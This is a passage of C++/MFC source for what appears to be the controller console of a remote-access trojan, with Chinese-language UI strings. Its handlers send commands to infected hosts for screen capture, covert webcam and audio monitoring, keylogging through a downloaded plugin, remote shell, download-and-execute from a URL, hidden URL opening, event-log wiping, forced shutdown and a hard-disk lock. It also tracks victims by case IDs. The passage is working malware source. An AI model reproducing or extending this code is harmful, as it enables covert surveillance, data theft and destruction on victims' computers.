	if ( FirstRunPass )
	{
		if ( ConnPass.GetLength() == 0 )
		{
			CString pass = m_inifile.GetString( "Settings", "OnLinePass", "" );
			if ( pass.GetLength() != 0 )
			{
				ConnPass.Format( "%s", EnDeCode::decrypt(EnDeCode::Decode(pass.GetBuffer(0))) ); 
			}
		}
		FirstRunPass = FALSE;
	}
	LOG((LEVEL_INFO,"FirstRunPass=%s\n",FirstRunPass?"TRUE":"FALSE"));

	CString	strToolTipsText, strOS;

	int nCnt = m_pListCtrl->GetItemCount();

		// 不合法的数据包--不同版本的这个结构体大小不一，所以这里把这个条件删除了
// 		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
// 			return -1;

	LOGININFO*	LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
	if (NULL == LoginInfo)
	{
		LOG((LEVEL_ERROR,"LoginInfo=NULL"));
		return -1;
	}
	if ( LoginInfo->bToken == TOKEN_LOGIN_FALSE )//发送密码验证，进一步上线
	{
		LOG((LEVEL_INFO,"发送COMMAND_ACTIVE\n"));
		UINT nSize = ConnPass.GetLength() + 2;
		BYTE *sByt = new BYTE [ nSize ];//COMMAND_ACTIVED;
		sByt[0] = COMMAND_ACTIVED;			
		lstrcpy( (char*)(sByt + 1), ConnPass.GetBuffer(0) );					
		m_iocpServer->Send( pContext, sByt, nSize );

		delete[] sByt;
		return 0;
	}

	LOG((LEVEL_INFO,"调用(OnOnline()\n"));
	OnOnline(pContext);



	return 0;
}
int CTSPClientView::GetItemCount()
{
	if(m_pListCtrl==NULL)return 0;
	int Count=m_pListCtrl->GetItemCount();
	return Count;
}
int CTSPClientView::GetEnableCount()
{
	if(m_pListCtrl==NULL)return 0;
	int EnableCount=0;
	for(int i=0;i<m_pListCtrl->GetItemCount();i++)
	{
		INFO_DB_CONTRAST *tmpNode = (INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i);
		if(CString(tmpNode->StateName).Find("上线")>=0)
			EnableCount++;
	}
	return EnableCount;
}
LRESULT CTSPClientView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	ClientContext	*pContext = (ClientContext *)lParam;
	if (pContext == NULL)
		return -1;
	// 删除链表过程中可能会删除Context

		int nCnt = m_pListCtrl->GetItemCount();
		for (int i=0; i < nCnt; i++)
		{
			
			if (pContext == (ClientContext	*)(((INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i))->lpContent))
			{
				g_log.Log(0,_T("下线 ID %s, WAN %s, LAN %s, 计算机名/备注 %s, 硬件标识%s, 线索编号%s, 线索名称%s\r\n"), \
					m_pListCtrl->GetItemText( i , COL_ID), \
					m_pListCtrl->GetItemText( i , COL_WAN), \
					m_pListCtrl->GetItemText( i , COL_LAN), \
					m_pListCtrl->GetItemText( i , COL_COMPNAME),\
					m_pListCtrl->GetItemText( i , COL_HARDID),\
					m_pListCtrl->GetItemText( i , COL_CLUE_ID),\
					m_pListCtrl->GetItemText( i , COL_CLUENAME));\

					OnOffline(pContext);

				break;
			}		
		}

		// 关闭相关窗口

		switch (pContext->m_Dialog[0])
		{
		case FILEMANAGER_DLG:
		case SCREENSPY_DLG:
		case WEBCAM_DLG:
		case AUDIO_DLG:
		case KEYBOARD_DLG:
		case SYSTEM_DLG:
		case SHELL_DLG:
			//((CDialog*)pContext->m_Dialog[1])->SendMessage(WM_CLOSE);
			((CDialog*)pContext->m_Dialog[1])->DestroyWindow();
			break;
		default:
			break;
		}



	// 更新当前连接总数
	g_pFrame->ShowConnectionsNumber();
	return 0;
}

void CTSPClientView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	// TODO: Add your command handler code here
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* pContext =(ClientContext*)((INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(nItem))->lpContent;
		
		// 发送获得驱动器列表数据包
		if(pContext)
			m_iocpServer->Send(pContext, pData, nSize);

		//Save the pointer to the new item in our CList
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memoryt	
}

void CTSPClientView::OnFilemanager()
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_LIST_DRIVE;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CTSPClientView::OnScreenspy() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SCREEN_SPY;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CTSPClientView::OnWebcam() 
{
	if (MessageBox("视像头查看有可能被发现，是否继续?", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
	{
		return ;

	}
	BYTE	bToken = COMMAND_WEBCAM;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CTSPClientView::OnAudioListen() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_AUDIO;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CTSPClientView::OnDownexec() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("下载者"), _T("请输入要下载文件的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}

	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DOWN_EXEC;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);



	SendSelectCommand(lpPacket, nPacketLength);

	delete[] lpPacket;
}


void CTSPClientView::OnRemove() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认卸载服务端吗 -:)", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
// 	BYTE	bToken = COMMAND_REMOVE;
// 	SendSelectCommand(&bToken, sizeof(BYTE));

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos)
	{
//		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));
		int nItem = m_pListCtrl->GetNextSelectedItem(pos);
		ClientContext* dwContext =(ClientContext*)((INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(nItem))->lpContent;

		char szHardID[64] = {0};
		ZeroMemory(szHardID, sizeof(szHardID));
		m_pListCtrl->GetItemText(nItem, COL_HARDID, szHardID, sizeof(szHardID));
		RemoveServer(dwContext, szHardID, nItem);
		
	}
	WriteDbFile();
	WriteMacFile();
	if(g_pFrame)
		g_pFrame->ShowConnectionsNumber();
}


void CTSPClientView::OnKeyboard() 
{
	// TODO: Add your command handler code here
	//return;
	//BYTE	bToken = COMMAND_KEYBOARD;

	DWORD   dwMsgSize=sizeof(AUTOSREECNCONFIG)+1;
	BYTE	*msg=new BYTE[dwMsgSize];
	memset(msg,0,dwMsgSize);
	msg[0]= COMMAND_KEYBOARD;

	pAUTOSREECNCONFIG pAutosreecnconfig=(pAUTOSREECNCONFIG)&msg[1];

	strncpy(pAutosreecnconfig->szFtppass,"pass",sizeof(pAutosreecnconfig->szFtppass));//插件的账户
	strncpy(pAutosreecnconfig->szFtpUser,"pass",sizeof(pAutosreecnconfig->szFtpUser));
	strncpy(pAutosreecnconfig->szPlugName,"KeyLog.dll",sizeof(pAutosreecnconfig->szPlugName));
    strncpy(pAutosreecnconfig->szDownLoadPlugUrl,LICSERVER_IPADDR,sizeof(pAutosreecnconfig->szDownLoadPlugUrl));
	SendSelectCommand(msg,dwMsgSize);
	delete msg;
}

void CTSPClientView::OnSystem() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SYSTEM;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CTSPClientView::OnRemoteshell() 
{
	// TODO: Add your command handler code here
	BYTE	bToken = COMMAND_SHELL;
	SendSelectCommand(&bToken, sizeof(BYTE));	
}

void CTSPClientView::OnLogoff() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认要注销主机电脑吗?", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_LOGOFF | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));
}

void CTSPClientView::OnReboot() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认要重启主机电脑吗?", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_REBOOT | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos)
	{
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));
	}
}

void CTSPClientView::OnShutdown() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认要关闭主机电脑吗?", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	BYTE bToken[2];
	bToken[0] = COMMAND_SESSION;
	bToken[1] = EWX_SHUTDOWN | EWX_FORCE;
	SendSelectCommand((LPBYTE)&bToken, sizeof(bToken));

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos)
	{
		m_pListCtrl->DeleteItem(m_pListCtrl->GetNextSelectedItem(pos));
	}
}

void CTSPClientView::OnSelectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);   
	}
}

void CTSPClientView::OnUnselectAll() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		m_pListCtrl->SetItemState(i, 0, LVIS_SELECTED);
	}	
}

void CTSPClientView::OnOpenUrlHide() 
{
	// TODO: Add your command handler code here

	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要隐藏访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_HIDE;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);


	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CTSPClientView::OnOpenUrlShow() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("远程访问网址"), _T("请输入要显示访问的网址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_URL_SHOW;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);


	
	SendSelectCommand(lpPacket, nPacketLength);
	
	delete[] lpPacket;	
}

void CTSPClientView::OnCleanevent()
{
	BYTE	bToken = COMMAND_CLEAN_EVENT;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


void CTSPClientView::OnSecretFetch() 
{
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	CString strClueID;
	if (NULL != pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		strClueID = m_pListCtrl->GetItemText(nItem, 11);
	}
	
	int nLen = 0;
	BYTE bToken[MAX_PATH] = {0};
	bToken[0] = COMMAND_SERECT_CFG;

	if (0 == strClueID.GetLength())
	{		
		nLen = 1;
	}
	else
	{
		lstrcpy((LPSTR)&(bToken[1]), strClueID);
		nLen = strClueID.GetLength() + 1;
	}

	SendSelectCommand(bToken, nLen);
}


void CTSPClientView::OnRenameRemark() 
{
	// TODO: Add your command handler code here

	CString strTitle;
	if (m_pListCtrl->GetSelectedCount() == 1)
		strTitle.Format("更改主机(%s)的备注", m_pListCtrl->GetItemText(m_pListCtrl->GetSelectionMark(), 3));
	else
		strTitle = "批量更改主机备注";
	CInputDialog	dlg;
	dlg.Init(strTitle, _T("请输入新的备注:"), this);
	if (dlg.DoModal() != IDOK || dlg.m_str.GetLength()== 0)   
		return;
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_RENAME_REMARK;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);

	
	SendSelectCommand(lpPacket, nPacketLength);
	
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while(pos)
	{
		int	nItem = m_pListCtrl->GetNextSelectedItem(pos);
		PINFO_DB_CONTRAST pItem=(PINFO_DB_CONTRAST)m_pListCtrl->GetItemData(nItem);
		memcpy(pItem->szComputerName,dlg.m_str.GetBuffer(),sizeof(pItem->szComputerName)-1);
		
		m_pListCtrl->SetItemText(nItem, COL_COMPNAME, dlg.m_str);
	}

	delete[] lpPacket;
	//修改完备注;需要保存设置
	WriteDbFile();
}

void CTSPClientView::OnUpdateServer() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("下载更新服务端"), _T("请输入要下载新服务端的地址:"), this);
	if (dlg.DoModal() != IDOK)   
		return;
	dlg.m_str.MakeLower();
	if (dlg.m_str.Find("http://") == -1)
	{
		MessageBox("输入的网址不合法", "错误");
		return;
	}
	
	int		nPacketLength = dlg.m_str.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_UPDATE_SERVER;
	memcpy(lpPacket + 1, dlg.m_str.GetBuffer(0), nPacketLength - 1);


	
	SendSelectCommand(lpPacket, nPacketLength);
	delete[] lpPacket;	
}

void CTSPClientView::OnDisconnect() 
{
	// TODO: Add your command handler code here
	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition();
	while (pos) 
	{
		int nItem=m_pListCtrl->GetNextSelectedItem(pos);
		PINFO_DB_CONTRAST pItem=(PINFO_DB_CONTRAST)(m_pListCtrl->GetItemData(nItem));
		ClientContext *pContext=(ClientContext *)(pItem->lpContent);
		if(pContext)
		{
			g_log.Log(0,"发送完断开连接命令(%08x,%08x)\n",pContext,pContext->m_Socket);
			m_iocpServer->RemoveStaleClient(pContext,FALSE,FALSE);
		}
		if(strcmp(pItem->StateName,"下线")!=0)
		{
			strcpy(pItem->StateName,"下线");
		}
		m_pListCtrl->SetItemText(nItem,COL_STATE,pItem->StateName);
		pItem->lpContent=NULL;
	}
}

void CTSPClientView::OnAppPwd() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("提示"), _T("请输入要设置的密码:"), this);
	if (dlg.DoModal() != IDOK)
		return;
	dlg.m_str.MakeLower();
	ConnPass = dlg.m_str;

	m_inifile.SetString( "Settings", "OnLinePass", EnDeCode::Encode(EnDeCode::encrypt(ConnPass.GetBuffer(0))) );

	AfxMessageBox("设置完成,请等待服务端上线.");
}

void CTSPClientView::OnExit() 
{


	ExitProcess(0);
}

void CTSPClientView::OnHitHard() 
{
	// TODO: Add your command handler code here
	if (MessageBox("确认要加硬盘锁吗?慎用!", "Warning", MB_YESNO | MB_ICONWARNING) == IDNO)
		return;
	BYTE	bToken = COMMAND_HIT_HARD;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CTSPClientView::OnGengxin() 
{
	// TODO: Add your command handler code here
	gengxin.DoModal();
}

void CTSPClientView::OnOpen3389() 
{
	// TODO: Add your command handler code here
	if (MessageBox("此功能适用于2003服务器,不是网上流传的XP下双开!\n但是XP系统也可以尝试\n注意:对于2000系统需要重新启动\n继续吗?", "提示", MB_YESNO | MB_ICONWARNING) == IDNO)
       return;
	BYTE	bToken = COMMAND_OPEN_3389;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CTSPClientView::OnFindxp() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
// 		CString  str=m_pListCtrl->GetItemText( i, 4 );
// 		OutputDebugStringA(str);
		if ( ( m_pListCtrl->GetItemText( i, 7 ).Find( "XP" ) ) != -1 )
		{
			m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		}
	}
}

void CTSPClientView::OnFind2003() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( m_pListCtrl->GetItemText( i, 7 ).Find( "2003" ) ) != -1 )
		{
			m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		}
	}
}

void CTSPClientView::OnFindcam() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( m_pListCtrl->GetItemText( i, 11 ).Find( "有" ) ) != -1 )
		{
			m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		}
	}
}

void CTSPClientView::OnFind2000() 
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( m_pListCtrl->GetItemText( i, 7 ).Find( "2000" ) ) != -1 )
		{
			m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		}
	}
}

void CTSPClientView::OnFindaddr() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("筛选主机"), _T("请输入要要筛选的地理位置:(关键字)"), this);
	if (dlg.DoModal() != IDOK)
		return;
	
	for (int i = 0; i < m_pListCtrl->GetItemCount(); i++)   
	{   
		if ( ( m_pListCtrl->GetItemText( i,3 ).Find( dlg.m_str.GetBuffer(0) ) )  != -1 )
		{
			m_pListCtrl->SetItemState(i, LVIS_SELECTED, LVIS_SELECTED);
		}
	}
}

void CTSPClientView::OnDownchajian() 
{
	// TODO: Add your command handler code here
	CInputDialog	dlg;
	dlg.Init(_T("调用插件"), _T("DLL插件的URL地址(调用\"PluginFunc\"函数)"), this);
	if (dlg.DoModal() != IDOK) return;
	if ( dlg.m_str.Find("http://") == -1 )
	{
		AfxMessageBox("输入的URL无效");
		return;
	}
	BYTE msg[128];
	msg[0] = COMMAND_CHAJIAN;
	memcpy( &msg[1], dlg.m_str.GetBuffer(0), 127 );


	SendSelectCommand( &msg[0], dlg.m_str.GetLength() + 2);
}


DWORD WINAPI CTSPClientView::DownloadClientEx(LPVOID lpVoid)
{
	return ((CTSPClientView *)lpVoid)->DownloadClient();
}


DWORD CTSPClientView::DownloadClient()
{
	SOCKET sockInt;

	CString strErr;
	strErr = "新版控制端下载成功,程序即将退出，请用新下载的文件覆盖原有的程序,然后运行";

	BOOL bRet = FALSE;
	do 
	{
		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET)
		{
			strErr = "Login error!\n";
			break;
		}



		m_dlgProgress.ShowClientUpdataInfo(sockInt,"ClientUpdataInfo.txt");

		closesocket(sockInt);		


		sockInt = LoginLicenseSvr();
		if(sockInt == INVALID_SOCKET)
		{
			strErr = "Login error!\n";
			break;
		}


		//DWORD recvsize = 0;
		
		//NET_DATA MyData = {0};
		DWORD dwBytes = 0;;
		HANDLE hFile = CreateFile(m_strServerFile, GENERIC_WRITE, FILE_SHARE_WRITE|FILE_SHARE_READ, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL );
		BYTE request[256] = {0};
		request[0] = DOWN_CLIENT;
		//char *laji = "48f9648";


		if ( GetFileAttributes(m_strServerFile) == -1 )
		{
			strErr = ("File is exist and can't delete!");
			break;
		}
		
		do 
		{
			send( sockInt, (char*)&request, sizeof(request),NULL);
			
			//接收文件的大小
			DWORD dwFileSize=0;
			recv( sockInt,(char*)&dwFileSize,sizeof(DWORD),NULL);

			char *RecvData=new char[RECV_MAX_BUF];
			DWORD recvsize = 0;
			//char *laji = "48f9648";	

			//int		nRecvRetry = 15;


			while (TRUE)
			{
				memset(RecvData, 0,RECV_MAX_BUF);

				int dwRetSize = recv( sockInt,RecvData,RECV_MAX_BUF,NULL);
				if ( dwRetSize == 0 || dwRetSize == SOCKET_ERROR )
				{
					strErr = "获取文件出错!";
					break;
				}


				recvsize += dwRetSize;
				m_dlgProgress.SetPos(recvsize,dwFileSize);

				if ( recvsize>=dwFileSize ) 
				{

					WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
					bRet = TRUE;
					break;
				}
				WriteFile(hFile,RecvData,dwRetSize,&dwBytes, NULL);
		//		send( sockInt, laji, sizeof(laji),NULL);
			}

		delete RecvData;


		} while (FALSE);


		//关闭文件
		CloseHandle(hFile);
		
	} while (FALSE);

	//关闭SOCK
	closesocket(sockInt);		

	m_dlgProgress.MessageBox(strErr,0,0);

	m_dlgProgress.SendMessage(WM_CLOSE);
	// 	::PostMessage(m_dlgProgress.m_hWnd, WM_QUIT, NULL, NULL);

	ExitProcess(0);

	return bRet;	
}


BOOL CTSPClientView::UpdateClue()
{
	if (!::PathFileExists(m_szClueFileName))//不存在对应文件
	{
		return FALSE;
	}

	//读取对应文件
	ReadClueFile();

	//更新列表内容
	UpdateListCtrl();

	//WriteMacFile();


	return TRUE;
}


BOOL CTSPClientView::ReadClueFile()
{
	g_log.Log(0,"读Clue文件%s\n",m_szClueFileName);
	if (!::PathFileExists(m_szClueFileName))//不存在对应文件
	{
		return FALSE;
	}

	CStdioFile fileClue;
	if(!fileClue.Open(m_szClueFileName, CFile::modeRead | CFile::typeText)) 
	{
		return FALSE;
	}
//--------------------------
	m_csClueDataLock.WaitToWrite();
	int nArrCount = m_arrClue.GetCount();
	for (int i=0; i<nArrCount; i++)
	{
		PINFO_CLUE_CONTRAST pTemp = m_arrClue.GetAt(i);
		delete pTemp;
	}
	m_arrClue.RemoveAll();
	m_csClueDataLock.Done();
//-------------------------
	CString strLine;

	//m_csClueFileLock.WaitToRead();
	while (fileClue.ReadString(strLine))
	{
		PINFO_CLUE_CONTRAST pNodeClue = new INFO_CLUE_CONTRAST;
		::ZeroMemory(pNodeClue, sizeof(INFO_CLUE_CONTRAST));

		CString resToken;
		int curPos = 0;

		resToken= strLine.Tokenize(_T("	"),curPos);
		int nColume = 0;
		while (resToken != _T(""))
		{
			if (IPCOLUME == nColume)
			{
				lstrcpy(pNodeClue->szIP, resToken);
			}
			
			if (CLUECOLUME == nColume)
			{
				lstrcpy(pNodeClue->szClueID, resToken);
			}

			if (CLUENAME == nColume)
			{
				lstrcpy(pNodeClue->szClueName, resToken);
//				break;
			}

			if (CASEID == nColume)
			{
				lstrcpy(pNodeClue->szCaseID, resToken);
				break;
			}
			//例如
			//14.120.104.58	00000004	ffffffff	00000000	43	7	dgy82866093	1.1.1.1:8080	20	0	0	17
			//pNodeClue->szClueName="dgy82866093:43"
			//pNodeClue->szClue="20"
			resToken = strLine.Tokenize(_T("	"), curPos);
			nColume++;
		};   

		if (0 == lstrlen(pNodeClue->szIP) || 0 == lstrlen(pNodeClue->szCaseID))
		{
			delete pNodeClue;
			pNodeClue = NULL;
		}
//---------------------------
		m_csClueDataLock.WaitToWrite();
		if (NULL != pNodeClue)
		{
			m_arrClue.Add(pNodeClue);	
		}
		m_csClueDataLock.Done();
//---------------------------
	}
	//m_csClueFileLock.Done();
	fileClue.Close();
	m_csClueDataLock.WaitToRead();
	g_log.Log(0,"读Clue文件记录个数%d\n",m_arrClue.GetCount());
	m_csClueDataLock.Done();
	return TRUE;
}


BOOL CTSPClientView::ReadMacFile()
{
	if (!::PathFileExists(m_szMacFileName))//不存在对应文件
	{
		return FALSE;
	}

	CStdioFile fileMac;
	if(!fileMac.Open(m_szMacFileName, CFile::modeRead | CFile::typeText)) 
	{
		return FALSE;
	}

	m_csMacDataLock.WaitToWrite();
	int nArrCount = m_arrMac.GetCount();
	for (int i=0; i<nArrCount; i++)
	{
		PINFO_MAC_CONTRAST pTemp = m_arrMac.GetAt(i);
		delete pTemp;
	}

	m_arrMac.RemoveAll();
	m_csMacDataLock.Done();

	CString strLine;
	m_csMacFileLock.WaitToRead();
	while (fileMac.ReadString(strLine))
	{
		PINFO_MAC_CONTRAST pNodeMac = new INFO_MAC_CONTRAST;
		::ZeroMemory(pNodeMac, sizeof(INFO_MAC_CONTRAST));

		CString resToken;
		int curPos = 0;

		resToken= strLine.Tokenize(_T("	"),curPos);
//		char *pClu,*pCas;//=strstr(pNodeMac->szClueID,":");


		int nColume = 0;
		while (resToken != _T(""))
		{
			if (0 == nColume)
			{
				lstrcpy(pNodeMac->szMAC, resToken);
			}

			if (1 == nColume)
			{
				lstrcpy(pNodeMac->szCaseID, resToken);
			}

			if (2 == nColume)
			{
				char *p=(char*)strchr(resToken,':');
				if(p)
				{
					if((p-resToken)<sizeof(pNodeMac->szClueName))
					{
						memcpy(pNodeMac->szClueName,resToken,p-resToken);
						pNodeMac->szClueName[p-resToken]=0;
					}else
					{
						memcpy(pNodeMac->szClueName,resToken,sizeof(pNodeMac->szClueName));
						pNodeMac->szClueName[sizeof(pNodeMac->szClueName)-1]=0;
					}
					lstrcpy(pNodeMac->szClueID, p+1);
				}else
				{
					lstrcpy(pNodeMac->szClueID, "");
					lstrcpy(pNodeMac->szClueName, resToken);
				}
				break;
			}

			resToken = strLine.Tokenize(_T("	"), curPos);
			nColume++;
		};   

		if (0 == lstrlen(pNodeMac->szMAC) || 0 == lstrlen(pNodeMac->szCaseID))
		{
			delete pNodeMac;
		}
		m_csMacDataLock.WaitToWrite();
		m_arrMac.Add(pNodeMac);		
		m_csMacDataLock.Done();
	}

	m_csMacFileLock.Done();
	fileMac.Close();

	return TRUE;
}


BOOL CTSPClientView::WriteMacFile()
{
	CStdioFile fileMac;
	if(!fileMac.Open(m_szMacFileName, CFile::modeWrite | CFile::modeCreate| CFile::typeText)) 
	{
		return FALSE;
	}
	
	BOOL bRet = FALSE;
	m_csMacDataLock.WaitToRead();
	do 
	{
		int nArrCount = m_arrMac.GetCount();
		char szLine[MAX_PATH] = {0};
		m_csMacFileLock.WaitToWrite();

		for (int i=0; i<nArrCount; i++)
		{
			::ZeroMemory(szLine, sizeof(szLine));
			wsprintf(szLine, "%s	%s	%s:%s\n", m_arrMac.GetAt(i)->szMAC, m_arrMac.GetAt(i)->szCaseID, m_arrMac.GetAt(i)->szClueName,m_arrMac.GetAt(i)->szClueID);
			fileMac.WriteString(szLine);
		}
		m_csMacFileLock.Done();

		bRet = TRUE;

	} while (FALSE);

	m_csMacDataLock.Done();
	fileMac.Close();

	return bRet;
}

BOOL CTSPClientView::MapClue(char *pIpWan,char *HardID)
{
	// 外网IP
	m_csClueDataLock.WaitToRead();
	int nCountArr = m_arrClue.GetCount();
	for (int j=0; j<nCountArr; j++)
	{
		if (0 == lstrcmpi(pIpWan, m_arrClue.GetAt(j)->szIP))
		{
			m_csClueDataLock.Done();
			return TRUE;
		}
	}
	m_csClueDataLock.Done();
//-------------------------------
	//对没有映射到线索的进行mac地址的第二次映射
	//------------------------
	m_csMacDataLock.WaitToRead();
	nCountArr = m_arrMac.GetCount();
	for (int j=0; j<nCountArr; j++)
	{
		char *strArr = m_arrMac.GetAt(j)->szMAC;
		if (strcmp(HardID,strArr)==0)
		{
			m_csMacDataLock.Done();
			return TRUE;
		}
	}
	m_csMacDataLock.Done();
	//-----------------------
	return FALSE;
}

BOOL CTSPClientView::UpdateListCtrl()
{
	int nCountList = m_pListCtrl->GetItemCount();

	m_csClueDataLock.WaitToRead();
	int nCountArr = m_arrClue.GetCount();
	if (0 != nCountArr)
	{
		for (int i=0; i<nCountList; i++)
		{
			for (int j=0; j<nCountArr; j++)
			{
				INFO_DB_CONTRAST* pItem=(INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i);
				if (0 == lstrcmpi(pItem->IPWAN, m_arrClue.GetAt(j)->szIP))
				{		
					memcpy(pItem->szClueID, m_arrClue.GetAt(j)->szClueID,sizeof(pItem->szClueID)-1);
					memcpy(pItem->szCaseID, m_arrClue.GetAt(j)->szCaseID,sizeof(pItem->szCaseID)-1);
					memcpy(pItem->szClueName, m_arrClue.GetAt(j)->szClueName,sizeof(pItem->szClueName)-1);
					
					UpdateArrMac(i);
					break;
				}
			}
		}
	}
	m_csClueDataLock.Done();
	//对没有映射到线索的进行mac地址的第二次映射
	m_csMacDataLock.WaitToRead();
	CString strCaseID;
	nCountArr = m_pListCtrl->GetItemCount();
	if (0 != nCountArr)
	{
		for (int i=0; i<nCountList; i++)
		{
			INFO_DB_CONTRAST* pItem=(INFO_DB_CONTRAST*)m_pListCtrl->GetItemData(i);
			strCaseID = pItem->szCaseID;

			if (0 != lstrlen(strCaseID))
			{
				continue;
			}

			for (int j=0; j<nCountArr; j++)
			{
				CString strMac = pItem->szHardID;
				CString strArr = m_arrMac.GetAt(j)->szMAC;
				if (strMac == strArr)
				{
					memcpy(pItem->szClueID,m_arrMac.GetAt(j)->szClueID, sizeof(pItem->szClueID)-1);
					memcpy(pItem->szCaseID, m_arrMac.GetAt(j)->szCaseID,sizeof(pItem->szCaseID)-1);
					memcpy(pItem->szClueName, m_arrMac.GetAt(j)->szClueName, sizeof(pItem->szClueName)-1);
					break;
				}
			}
		}
	}
	m_csMacDataLock.Done();
	return TRUE;
}

BOOL   GetPassBackFile(char *szHardId,OUT LPTSTR strOutFile)
{
	char szPassBackFileList[MAX_PATH];
